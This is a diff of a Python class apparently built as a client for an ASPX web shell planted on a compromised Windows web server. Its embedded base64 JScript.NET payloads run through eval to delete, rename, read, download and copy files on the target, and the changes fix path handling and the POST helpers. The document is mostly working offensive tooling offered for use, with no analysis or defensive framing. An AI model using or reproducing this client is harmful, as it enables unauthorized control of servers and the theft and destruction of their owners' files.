@@ -24,8 +24,9 @@ class aspxshell:
         '''.strip()
         self.shellpass = shellpass
         self.url = url
-        data = {shellpass : code}
-        html = Spider.post(url, code)
+        #data = {shellpass : code}
+        code = shellpass + '=' +code
+        html = Spider.oldpost(url, code)  
         self.sitepath =  html[:html.rfind("\\")+1].replace('\\', '\\\\')
         print self.sitepath
         
@@ -81,7 +82,7 @@ class aspxshell:
         Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFA6U3RyaW5nPVJlcXVlc3QuSXRlbVsiejEiXTtpZihTeXN0ZW0uSU8uRGlyZWN0b3J5LkV4aXN0cyhQKSl7U3lzdGVtLklPLkRpcmVjdG9yeS5EZWxldGUoUCx0cnVlKTt9ZWxzZXtTeXN0ZW0uSU8uRmlsZS5EZWxldGUoUCk7fVJlc3BvbnNlLldyaXRlKCIxIik7")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
         '''.strip()
         if path.find('\\') < 0:
-            path = self.sitepath
+            path = self.sitepath  + path
         else:
             path = path.replace('\\', '\\\\')
         code += "&{0}".format(urllib.urlencode({'z1':path}))
@@ -96,44 +97,67 @@ class aspxshell:
         code = '''
         Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIHNyYz1SZXF1ZXN0Lkl0ZW1bInoxIl0sZHN0PVJlcXVlc3QuSXRlbVsiejIiXTtpZiAoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoc3JjKSl7U3lzdGVtLklPLkRpcmVjdG9yeS5Nb3ZlKHNyYyxkc3QpO31lbHNle1N5c3RlbS5JTy5GaWxlLk1vdmUoc3JjLGRzdCk7fVJlc3BvbnNlLldyaXRlKCIxIik7")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
         '''.strip()
-        suffix =  os.path.dirname(oldname)
-        newname = suffix + os.sep + newname
-        code += "&{0}&{1}".format(urllib.urlencode({'z1':oldname.replace('\\', '\\\\')}), urllib.urlencode({'z2':newname.replace('\\', '\\\\')}))
-        code =  code.replace('+', '%20')
-        with open('E:\\Python27\\code\\tools\\tmp.txt', 'w') as file:
-            file.write(code)
-        # print Spider.post(code)
-        del suffix, code
+        if oldname.find('\\') < 0:
+            oldname = self.sitepath + oldname
+        if newname.find('\\') < 0:
+            newname = self.sitepath + newname
+        code += "&{0}&{1}".format(urllib.urlencode({'z1':oldname}), urllib.urlencode({'z2':newname}))
+        # code =  code.replace('+', '%20')
+        code = self.shellpass + '=' + code
+        data = Spider.oldpost(self.url,code)
+        if "->|1|<-" in data:
+            printf("rename file ok")
 
     #todo 同上
     def ReadFile(self, path):
         code ='''
         var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFA9U3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoOTM2KS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTt2YXIgbT1uZXcgU3lzdGVtLklPLlN0cmVhbVJlYWRlcihQLEVuY29kaW5nLkRlZmF1bHQpO1Jlc3BvbnNlLldyaXRlKG0uUmVhZFRvRW5kKCkpO20uQ2xvc2UoKTs%3D")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);};
         '''.strip()
-        code += "&z1={0}".format(base64.b64encode(path.replace('\\', '\\\\')))
-        print Spider.post(code)
+        if path.find('\\') < 0:
+            path = self.sitepath + path
+        else:
+            path = path.replace('\\', '\\\\')
+        code += "&z1={0}".format(base64.b64encode(path))
+        # data = Spider.post(self.url ,code)
+        code = self.shellpass + '=' +code
+        printf(Spider.oldpost(self.url ,code))
         del code
 
     #todo 同上
     def DownloadFile(self, path):
         code = '''
-        Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("UmVzcG9uc2UuV3JpdGVGaWxlKFJlcXVlc3QuSXRlbVsiejEiXSk7")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("|<-");Response.End();
+        var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("UmVzcG9uc2UuV3JpdGUoUmVxdWVzdC5JdGVtWyJ6MSJdKTs=")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.End();
         '''.strip()
-        code += "&{0}".format(urllib.urlencode({'z1':path.replace('\\', '\\\\')}))
-        code = code.replace('+', '%20')
-        with open('E:\\Python27\\code\\tools\\tmp.txt', 'w') as file:
-            file.write(code)
-        print Spider.post(code)
+        if path.find('\\') < 0:
+            tmp = path
+            path = self.sitepath + path
+            
+        else:
+            path = path.replace('\\', '\\\\')
+        data = {self.shellpass:code, 'z1':path}
+        # code += "&{0}".format(urllib.urlencode({'z1':path}))
+        # code = self.shellpass + '=' +code
+        data =  Spider.post(self.url ,data)
+        self.filesave(data, tmp)
         del code
 
     def CopyFile(self, oldfile, newfile):
         code ='''
         Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFM9UmVxdWVzdC5JdGVtWyJ6MSJdO3ZhciBEPVJlcXVlc3QuSXRlbVsiejIiXTtmdW5jdGlvbiBjcChTOlN0cmluZyxEOlN0cmluZyl7aWYoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoUykpe3ZhciBtPW5ldyBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbyhTKTt2YXIgaTt2YXIgZj1tLkdldEZpbGVzKCk7dmFyIGQ9bS5HZXREaXJlY3RvcmllcygpO1N5c3RlbS5JTy5EaXJlY3RvcnkuQ3JlYXRlRGlyZWN0b3J5KEQpO2ZvciAoaSBpbiBmKVN5c3RlbS5JTy5GaWxlLkNvcHkoUysiXFwiK2ZbaV0uTmFtZSxEKyJcXCIrZltpXS5OYW1lKTtmb3IgKGkgaW4gZCljcChTKyJcXCIrZFtpXS5OYW1lLEQrIlxcIitkW2ldLk5hbWUpO31lbHNle1N5c3RlbS5JTy5GaWxlLkNvcHkoUyxEKTt9fWNwKFMsRCk7UmVzcG9uc2UuV3JpdGUoIjEiKTs%3D")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
         '''.strip()
-        code += "&{0}&{1}".format(urllib.urlencode({'z1':oldfile.replace('\\', '\\\\')}), urllib.urlencode({'z2':newfile.replace('\\', '\\\\')}))
-        print Spider.post(code)
-        if "->|1|<-" in Spider.post(code):
-            print "copy ok"
+        if oldfile.find('\\') < 0:
+            oldfile = self.sitepath + oldfile
+        else:
+            oldfile = oldfile.replace('\\', '\\\\')
+        if newfile.find('\\') < 0:
+            newfile = self.sitepath + newfile
+        else:
+            newfile = newfile.replace('\\', '\\\\')
+        code += "&{0}&{1}".format(urllib.urlencode({'z1':oldfile}), urllib.urlencode({'z2':newfile}))
+        code = self.shellpass + '=' +code
+        data = Spider.oldpost(self.url ,code)
+        if "->|1|<-" in data:
+            printf("copy file ok")
         del code
 
 
